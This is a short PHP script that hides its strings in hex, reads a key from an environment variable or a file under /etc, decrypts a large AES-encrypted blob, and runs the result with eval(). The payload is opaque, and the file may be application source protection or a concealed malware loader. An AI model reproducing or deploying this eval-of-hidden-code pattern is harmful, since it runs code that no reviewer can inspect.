<?php

$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Te4/TYwIM/rEzJ3uscY7hw==');

$c=base64_decode(

'ARzaKKP8oUcLn3ZvwlviV+m9V2mQ+9BZCapofBH3LjfGIM8/C7bHl33ru1t3M/IiQbrctjZ4DDLJ' .
'NoMRt5uYfEBROfBiiqb6sJDAZmjqeE7FtVJROQVBSRUiyi9f5j9/lDaedNZPhTvbwKtCAV+12nGF' .
'8xLQKip2GfI4pMIHo5ERgjv+CoiD+0PHmLMvy5tiA71E0ovyJS0qkmAf//avGPr5uYXCcldoEBSj' .
'+i2hceRHWMhw6LBSXZQ4C/DUPQZEeNJ42enBDqzb+pEYYNHTR2a1v/m3U7i6oUu57C66iwDkkXh2' .
'VL9WFOUGH1fHgv0waqAmyh4XnMXlefXmCglTWjVBg+jPfPunH/Pv32RgjkLwIaeg1uzq7v/6D939' .
'HZNGmU+4bTJauXcdENaABmYhnhGJtrbzJf+juLEEZJnKO88lr/ePFiC1PHg+XnAE9edzjmTPo2pt' .
'HgjmxBLQWyLi1wEkH7cSAY9NB7v22Os0I1E9HxzsQfqS6cmGaniSqatHQIIllJmyooU7vxcNDDvQ' .
'qtuLkUcIaCqwtkpEhdqd7juPafOcijEd7IXbC5OvUiFFNLjiVzGoX5bkiiZ6IjrMevOjkQbgosO2' .
'BQkAe+zACmXNhvrnjAUo7h7GIurqHw/BE1PNiOS90SXyDxCDIb4/OEs0BJl4Gakb1W3/MxzP0wpl' .
'E0CY1Wi9nFajRgh7LeKzrcBqxe9hA6C17D14T/fEk9YJKTD5kwllgQc3nntf4oKjT64GXusixCCL' .
'DkRs2i/l4NXQjRsxjkRA8zpDqaCEm9IKTpIQADqHmr6GCArEEc/f44m2OFU8GpiFg6NXInTL2sj0' .
'0g9EDbt5tIaPGms+zzWyxksyVD3fuMDKEsD3/rqpSh8rhpz5OqY370J4NWHeHQJMpzMquYL29QmH' .
'jsxsPAwgEBzJFbcKwilEMu2j0iUoclsLxU/wmgOWSjlIZ7W8O1oXzWUvF2ClBdAzGUvYhx69vvda' .
'ys21KvERVOWllciWoPVUKOOq4KFTVq+t7iwGiuyCaLlMBXq/37Se4eDd5tasBpkaI+DQQKfwSlM1' .
'4+/LH2hxiGjI2vIec5q1T2QC6C0QlZTh3AF14phxzHgweY8Nfp7dUh26Ol8s007QQeJkK+PM71Lc' .
'me+LCRxY77pxHYrSMPj0wGIQXUKdDo9yRarKyB4yYM8kYPIwtEtkmTegcbpSZgUAQk2IU+hv8B8n' .
'TyqsaU8Uei939upbLp35zGlXKImtlEVqmBkcarzFKo429q+Vjk/7+EKdZRyZoT4tEcui7XFuW4U4' .
'AW5a5+AO7OhdlOPJdDqCSXtidcccQMA6dSRGZruxPzdJN1n7PwjUBKpC1wwi8n7Oo9+qR5zciYaa' .
'KpMLoh0PpUTczRTcdf6G1+LKSg/wWAFCOLlvZ6qkHXaxbiX6uZyvd7XJfXr6ZMdWGk3JDfwPLoLa' .
'zUOpSTq1cJTKWhSvB4XgyRBOeF3WdSJbjdM+ln42LXRFscImFkeS119pe403h5E8LB+Z6QCNvADk' .
'+aEbkAhsY/jBGTBy6xr0glwwY+dmiCes/M02jV64BPaapp6apJcZqgkgv1s3ZygMV7vSH/AH/mX3' .
'NHdpHN8APzRNMam7iSM61GU0Dbf3eQ7AHAaljKV4ZiHeapCuFxGLIzLWO2HnL3fGy8Kp07OxUGgq' .
'a9Ch9b39lqZIbTiCBmJTel4RQq7IQBFxKGkox72AmnTBRxhFN/GA7L4yFmCXsUPKAR+p+MQUpfcU' .
'YeuzAHGsHmSS6hdjp+HwLt3SFcWzRiAohANOZ0wRFYVA5zMDF4w/0oUIjcvoAUtLHVoEueqRn5VJ' .
'NpRVVwg2KnfG9jViS1WETYG7xS4sD5ewBJ375qCDYsgF2PayA5yvVgGc0UviKFvk0nxIqwur1xwU' .
'ANJbI3Z3xyz5UoFdzazXeuGZW8VkXweXLXYH4UskQuXoe62t0lCo5NSlLIYS1TQAU7jCEeWT1Q2X' .
'j9SDkKAGIDuhKUwhkzTwvalML3WidR3raC/Oa+/FMAot/b0hmRbEKXV19vlDupbpsM4+yGAVmVeX' .
'43+mdW1JF8h1+Ci+B0ewKUKblCpEGj1Acf12Eeuhg2OR+hJk4qDPPANDMLRUxFCKZPHRtjZQKXlm' .
'IU1uFGU0O+oMuoWKdstXhktwnwZBHn7GGfB/S0xSHFVeiZkiMDtSAJu+CrmohytNUS2mFFxpiH7j' .
'tLgxUNywZ5KtyPCMCNLC7ARXd5KGwuvUO6Qrm2v39EApVrsZWIs+f505WflfanOjMWFI26oqg5N+' .
'kTYVpuU+CZ3y1Ugan0utcqVfXQMkskpi45pErL9Tja97Jm2XOJDS22NW0m6BYBVuWOMxNs3RMHyU' .
'/LmZUwE+gMY/grt6w4NncMnKLcAo3WrxEQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval('?>'.$d);

